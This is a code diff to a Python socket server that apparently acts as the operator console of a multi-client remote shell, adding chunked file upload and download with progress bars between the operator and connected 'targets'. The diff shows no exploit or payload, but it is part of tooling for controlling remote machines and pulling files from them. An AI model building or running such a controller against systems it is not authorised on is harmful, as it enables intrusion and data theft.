@@ -4,6 +4,7 @@ import os
 import re
 from threading import Thread
 from queue import Queue
+import math
 
 def clear_screen():
     if os.name=="nt":
@@ -72,14 +73,14 @@ class Server:
                 client_reponse = str( conn.recv(1024), "utf-8" ).split("|")
                 if client_reponse[0]=="file_found":
                     print("File {} Exists".format(filename))
-                    print("Downloading...")
-                    file_data = conn.recv(20480)  # Receiving Data
-                    if not os.path.exists('files'):
-                        os.makedirs('files')
-                    with open( FILES_ROOT_PATH + "/" + filename, "wb" ) as file:
-                        file.write(file_data)
-                    print("File {} Downloaded".format(filename))
-                    print( client_reponse[1], end="" )
+                    data = RecvFile(conn)
+                    if data:
+                        if not os.path.exists('files'):
+                            os.makedirs('files')
+                        with open( FILES_ROOT_PATH + "/" + filename, "wb" ) as file:
+                            file.write( data )
+                        print("File {} Downloaded".format(filename))
+                        print( client_reponse[1], end="" )
                 else:
                     print("File not exists!")
                     print( client_reponse[1], end="" )
@@ -118,6 +119,94 @@ class Server:
         self.accept_connections()
 
 
+def RecvFile(conn,chunk_size=20480):
+    # Recv Size of File
+    response = conn.recv(chunk_size)
+    file_size = b''
+    if str(response,"utf-8")[-1]!="C":
+        while str(response,"utf-8")[-1]!="C":
+            file_size += response
+            response = conn.recv(chunk_size)
+    else:
+        file_size += response
+
+    file_size = str(file_size,"utf-8")[:-1:]
+    if file_size.isnumeric():
+        file_size = int(file_size) 
+        conn.send( str.encode("OK") )
+    else:
+        return False
+
+    print("Receiving a file of {:.2f} MB\n".format( (file_size/1024)/1024 ) )
+
+    data_received = b''
+    if file_size:
+        remaining_data = file_size - len(data_received) 
+        response = conn.recv( chunk_size if chunk_size < remaining_data else remaining_data )
+        while response:
+            data_received += response
+            conn.send( str.encode("OK","utf-8") )
+            total_width = 20
+            prercentage_completed = ( len(data_received)/file_size)*100
+            completed_width = math.ceil( (total_width*prercentage_completed)/100 )
+            remaining_width = total_width - completed_width
+            if len(data_received)!=file_size:
+                print( "|" + "\033[44m \033[0m"*completed_width + " "*remaining_width + "| {0:.2f}%".format(prercentage_completed), end="\r" )
+            else:
+                print( "|" + "\033[44m \033[0m"*completed_width + " "*remaining_width + "| {}%".format(prercentage_completed) )
+                print("Download Complete.")
+                return data_received
+
+            remaining_data = file_size - len(data_received) 
+            response = conn.recv( chunk_size if chunk_size < remaining_data else remaining_data )
+    else:
+        print("File is Empty")
+        return False
+
+def SendFile(conn,file,chunk_size=20480):
+    data = file.read(chunk_size)
+    if not data:
+        print("File is Empty")
+        return False
+
+    total_size = os.path.getsize(file.name)
+    data_sended = 0
+    print("Sending a {:0.2f} MB file...\n".format( (total_size/1024)/1024 ) )
+    
+    conn.send( str.encode( str(total_size)+"C", "utf-8" ) ) # Send Size of File to Client
+    try:
+        response = conn.recv(2)
+        if str(response,"utf-8")!="OK":
+            print("Something Went Wrong on Clint Side!")
+            return False
+    except Exception as msg:
+        print(msg)
+        return False
+
+    while data:
+        conn.send( data )
+        reponse = conn.recv(2)
+        try:
+            if str(reponse,"utf-8")=="OK":
+                data_sended += len(data)
+                data = file.read(chunk_size)
+                total_width = 20
+                prercentage_completed = (data_sended/total_size)*100
+                completed_width = math.ceil( (total_width*prercentage_completed)/100 )
+                remaining_width = total_width - completed_width
+                if data_sended!=total_size:
+                    print( "|" + "\033[44m \033[0m"*completed_width + " "*remaining_width + "| {0:.2f}%".format(prercentage_completed), end="\r" )
+                else:
+                    print( "|" + "\033[44m \033[0m"*completed_width + " "*remaining_width + "| {}%".format(prercentage_completed) )
+                    print("Upload Complete.")
+                    return True
+            else:
+                print("Something Went Wrong on Clint Side!")
+                return False
+        except Exception as msg:
+            print(msg)
+            return False
+
 
 def list_connections():
     global ALL_CONNECTIONS
@@ -146,7 +235,6 @@ def get_target(cmd):
         return conn
     except:
         return None
-
 
 def create_worker():
     global NUMBER_OF_THREADS
@@ -193,21 +281,10 @@ def start_shell():
                     conn, address = target
                     if os.path.isfile(FILES_ROOT_PATH + "/" + filename):
                         with open(FILES_ROOT_PATH + "/" + filename,"rb") as file:
-                            data = file.read()
-
                             # Send a msg so that client start receiving
                             conn.send( str.encode( "-recv_file {}".format(filename) ,"utf-8") )
-                            client_reponse = str( conn.recv(20480), "utf-8" ) #get reponse and check if its receiving
-                            if client_reponse=="receiving":
-                                print("Sending...")
-                                conn.send( data ) # Send file data
-                                client_reponse = str( conn.recv(20480), "utf-8" ) # get reponse
-                                if client_reponse=="received":
-                                    print("Sending file complete")
-                                else:
-                                    print("Error on client side")
-                            else:
-                                print("Error on client side")
+                            SendFile(conn,file)
+                            
                     else:
                         print("File Not Exist!")
                 else:
